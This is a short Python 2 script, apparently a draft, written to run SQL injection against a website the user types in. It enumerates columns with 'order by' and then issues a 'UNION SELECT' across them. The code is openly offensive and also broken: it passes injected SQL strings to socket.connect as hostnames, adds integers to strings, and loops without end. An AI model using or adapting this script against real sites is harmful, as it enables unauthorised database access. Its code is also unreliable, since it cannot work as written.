#plan on sqlinjection
#main idea on column

import socket 
import sys
import os 
import time
import urllib2                                  
import base64                                                           
import re                                                               
from urllib2  import URLError, HTTPError
from optparse import OptionParser        

#Target Website
website = raw_input( "Target Website:" )
#Connection to Website
hosc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Database Injection
#Column find
column = 1
order = hosc.connect((website + " order by" + column, 80))
socket.error
while hosc != socket.error:
    order
    column = column + 1

column2 = column - 2
print("The number of columns is" + column2)
allcolumn= range(1,column2)
hosc.connect((website + " UNION SELECT " + allcolumn, 80))   
            
#Results
